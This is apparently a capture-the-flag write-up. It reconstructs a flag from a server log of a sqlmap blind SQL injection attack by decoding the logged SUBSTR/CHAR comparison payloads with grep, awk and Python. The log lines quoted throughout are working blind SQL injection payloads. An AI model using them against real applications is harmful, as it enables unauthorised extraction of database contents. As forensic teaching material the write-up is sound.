1. Here we need to analyze a log file which has logs about a SQL injection attack. Based on that we need to figure out what the flag is
2. Looking at the SQLi payload, we can say this is boolean based injection because we have the logical operators (<,>) used.

```
2024-08-25 00:15:10,350 - werkzeug - INFO - 192.168.1.7 - - [25/Aug/2024 00:15:01] "GET /search?product='%20AND%203404%3D(CASE%20WHEN%20(9854>9853)%20THEN%20(LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))%20ELSE%203404%20END)--%20SPwN HTTP/1.1" 200 -
```

3. And based on the format, we can say this is from sqlmap. Since sqlmap compares each character ordinal value and sort of bruteforces the correct value, we can easily figure out what characters we have for each query.
4. Since this is a bruteforce, after it gets a correct hit for a character, it will return true or false based on the query and then move on to the next query. So the last request for each character should be the correct value for the that.
5. Looking at the end of the file, we can see sqlmap has identified the table as `products` the column as `description` and the id as `4` ( we can get a request from the log file, decode and format it to get this output)
6. If we look at the requests for `name` column, we can see the name for id `4` is `FLAG`

```bash
cat app.log|grep name|grep 'LIMIT%203,1'
```

Based on the theory, we need to extract the last character attempt for each character.

```
2024-08-25 00:15:10,350 - werkzeug - INFO - 192.168.1.7 - - [25/Aug/2024 00:15:10] "GET /search?product='%20AND%209332%3D(CASE%20WHEN%20(SUBSTR((SELECT%20COALESCE(`name`,CHAR(32))%20FROM%20products%20LIMIT%203,1),1,1)!%3DCHAR(70))%20THEN%20(LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2)))))%20ELSE%209332%20END)--%20vKph HTTP/1.1" 200 -
```

This one is for the first character, we can find that out from the `substr` function

```sql
SUBSTR((SELECT%20COALESCE(`name`,CHAR(32))%20FROM%20products%20LIMIT%203,1),1,1)
```

```python
>>> chr(70)
'F'
>>> chr(76)
'L'
>>> chr(65)
'A'
>>> chr(71)
'G'
>>>
```

7. We also see there is another field called the description. Therefore, we can go for the description of product with id 4 which is the `FLAG` product name.

```sql
└─$ cat app.log|urldecode| awk -F 'product=' '{ print $2 }'|grep description |awk -F 'HTTP/1.1' '{ print $1 }'|grep "LIMIT 3,1),1,1)"
' AND SUBSTR((SELECT COALESCE(CAST(description AS TEXT),CHAR(32)) FROM products LIMIT 3,1),1,1)>CHAR(65)-- Qlbf
' AND SUBSTR((SELECT COALESCE(CAST(description AS TEXT),CHAR(32)) FROM products LIMIT 3,1),1,1)>CHAR(96)-- Qlbf
' AND SUBSTR((SELECT COALESCE(CAST(description AS TEXT),CHAR(32)) FROM products LIMIT 3,1),1,1)>CHAR(80)-- Qlbf
' AND SUBSTR((SELECT COALESCE(CAST(description AS TEXT),CHAR(32)) FROM products LIMIT 3,1),1,1)>CHAR(72)-- Qlbf
' AND SUBSTR((SELECT COALESCE(CAST(description AS TEXT),CHAR(32)) FROM products LIMIT 3,1),1,1)>CHAR(76)-- Qlbf
' AND SUBSTR((SELECT COALESCE(CAST(description AS TEXT),CHAR(32)) FROM products LIMIT 3,1),1,1)>CHAR(74)-- Qlbf
' AND SUBSTR((SELECT COALESCE(CAST(description AS TEXT),CHAR(32)) FROM products LIMIT 3,1),1,1)>CHAR(73)-- Qlbf
```

Here we can see different ordinal values are compared to narrow down the correct value of the first character of the description field for `FLAG` product. Ordinal values start from 65 and then goes to see if the actual ordinal value is greater of less than that value. Finally, it narrows it down to 2 values as we can see which are 74 and 73.

First it checks if the ordinal value of the first character is greater than 74, according to the output of that it goes and see if its greater than 73. We can't say which is the correct value for sure in this case as we don't know the output of these queries. But we know that the flag starts as `INTIGRITI{`.

So the first character has to be `I` which has ordinal of 73.

```python
>>> chr(73)
'I'
>>>
```

Likewise, we can find 2-3 possible values for all the characters on the flag. We can sort of automate this to get the possible values for the flag. (From the log file we can see that this goes till the 28th character. Which means the description, our flag is 28 characters long, including the line break. So 27 characters in length)

```bash
for i in `seq 1 28`;do cat app.log|urldecode| awk -F 'product=' '{ print $2 }'|grep description |awk -F 'HTTP/1.1' '{ print $1 }'|grep "LIMIT 3,1),$i,1)"|tail -n 3|awk -F '>CHAR' '{ print $2 }'|awk -F '-- ' '{print $1}'|awk -F '(' '{ print $2 }'|awk -F ')' '{ print $1 }'|xargs -I {} python3 -c "print(chr({}))";echo '-----' ;done
```

```bash

L
J
I
-----
L
N
M
-----
T
R
S
-----
L
J
I
-----
D
F
G
-----
T
R
Q
-----
L
J
I
-----
T
R
S
-----
L
J
I
-----
|
z
{
-----
5
3
4
-----
p
r
q
-----
.
/
0
-----
\
^
_
-----
l
j
k
-----
l
n
o
-----
d
f
g
-----
]
^
_
-----
d
b
a
-----
l
n
m
-----
d
b
a
-----
l
j
k
-----
|
z
y
-----
t
r
s
-----
.
/
0
-----
p
r
s
-----
|
~
}
-----


```

We already know the first 9 characters are going to be `INTIGRITI` and then the 10th character is probably `{`.

```bash
└─$ cat app.log|urldecode| awk -F 'product=' '{ print $2 }'|grep description |awk -F 'HTTP/1.1' '{ print $1 }'|grep "LIMIT 3,1),10,1)"|tail -n 3|awk -F '>CHAR' '{ print $2 }'|awk -F '-- ' '{print $1}'|awk -F '(' '{ print $2 }'|awk -F ')' '{ print $1 }'|xargs -I {} python3 -c "print(chr({}))";echo ''
|
z
{
```

Yes, it is. We see it in the end.

Then from there on we can look at the possible values and create the flag from the characters we have.

But do note that, this is just a little trick. We should look at the queries that were made relevant to that character to figure out which of those are most likely to be the correct one.

For example, in the 13th character, we get these as the possible characters.

```bash
└─$ cat app.log|urldecode| awk -F 'product=' '{ print $2 }'|grep description |awk -F 'HTTP/1.1' '{ print $1 }'|grep "LIMIT 3,1),13,1)"|tail -n 3|awk -F '>CHAR' '{ print $2 }'|awk -F '-- ' '{print $1}'|awk -F '(' '{ print $2 }'|awk -F ')' '{ print $1 }'|xargs -I {} python3 -c "print(chr({}))";echo ''
.
/
0
```

But none of them are. Here if you look at the logs for that character, we can see how the comparing was done.

```bash
└─$ cat app.log|urldecode| awk -F 'product=' '{ print $2 }'|grep description |awk -F 'HTTP/1.1' '{ print $1 }'|grep "LIMIT 3,1),13,1)"
' AND SUBSTR((SELECT COALESCE(CAST(description AS TEXT),CHAR(32)) FROM products LIMIT 3,1),13,1)>CHAR(96)-- Qlbf
' AND SUBSTR((SELECT COALESCE(CAST(description AS TEXT),CHAR(32)) FROM products LIMIT 3,1),13,1)>CHAR(49)-- Qlbf
' AND SUBSTR((SELECT COALESCE(CAST(description AS TEXT),CHAR(32)) FROM products LIMIT 3,1),13,1)>CHAR(1)-- Qlbf
' AND SUBSTR((SELECT COALESCE(CAST(description AS TEXT),CHAR(32)) FROM products LIMIT 3,1),13,1)>CHAR(26)-- Qlbf
' AND SUBSTR((SELECT COALESCE(CAST(description AS TEXT),CHAR(32)) FROM products LIMIT 3,1),13,1)>CHAR(37)-- Qlbf
' AND SUBSTR((SELECT COALESCE(CAST(description AS TEXT),CHAR(32)) FROM products LIMIT 3,1),13,1)>CHAR(43)-- Qlbf
' AND SUBSTR((SELECT COALESCE(CAST(description AS TEXT),CHAR(32)) FROM products LIMIT 3,1),13,1)>CHAR(46)-- Qlbf
' AND SUBSTR((SELECT COALESCE(CAST(description AS TEXT),CHAR(32)) FROM products LIMIT 3,1),13,1)>CHAR(47)-- Qlbf
' AND SUBSTR((SELECT COALESCE(CAST(description AS TEXT),CHAR(32)) FROM products LIMIT 3,1),13,1)>CHAR(48)-- Qlbf
```

Here first its narrowing down the values from 96 down to 47 and then 48. If the output for the last request was False, then that means the correct value is 48. But if it was True, that means the correct value is greater than 48 which is 49.

```python
>>> chr(49)
'1'
>>>
```

So likewise, we need to look at the log file and compare the queries and find out the correct values of the flag.

8.  Like this we need to go through the whole flag from character to character. Then you can get the flag like this.
